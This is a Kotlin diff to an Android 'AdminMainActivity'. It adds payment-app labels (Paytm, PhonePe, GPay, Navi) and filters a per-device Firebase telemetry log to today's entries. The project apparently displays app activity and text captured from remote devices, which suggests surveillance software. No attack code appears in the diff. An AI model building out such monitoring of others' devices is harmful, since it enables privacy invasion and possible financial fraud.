@@ -17,6 +17,7 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 import java.text.SimpleDateFormat
+import java.util.Calendar
 import java.util.Date
 import java.util.Locale
 
@@ -165,6 +166,10 @@ class AdminMainActivity : AppCompatActivity() {
     private fun getPrettyAppName(pkg: String): String {
         return when {
             pkg.contains("whatsapp", true) -> "WhatsApp"
+            pkg.contains("paytm", true) -> "Paytm"
+            pkg.contains("phonepe", true) -> "PhonePe"
+            pkg.contains("paisa", true) -> "GPay"
+            pkg.contains("navi", true) -> "Navi"
             pkg.contains("chrome", true) -> "Chrome"
             pkg.contains("youtube", true) -> "YouTube"
             pkg.contains("instagram", true) -> "Instagram"
@@ -202,15 +207,25 @@ class AdminMainActivity : AppCompatActivity() {
                 // Sort newest on top
                 entries.sortByDescending { it.first }
 
+                // Filter for today's logs only and cap to 150 entries for maximum performance & zero lag
+                val calendar = Calendar.getInstance()
+                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
+                val todayYear = calendar.get(Calendar.YEAR)
+
+                val todayEntries = entries.filter { item ->
+                    calendar.timeInMillis = item.first
+                    calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear
+                }.take(150)
+
                 val sb = StringBuilder()
-                for (item in entries) {
+                for (item in todayEntries) {
                     val timeStr = timeFormat.format(Date(item.first))
                     sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                 }
 
                 val index = deviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
+                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded today."
                     adapter.notifyItemChanged(index)
                 }
             }
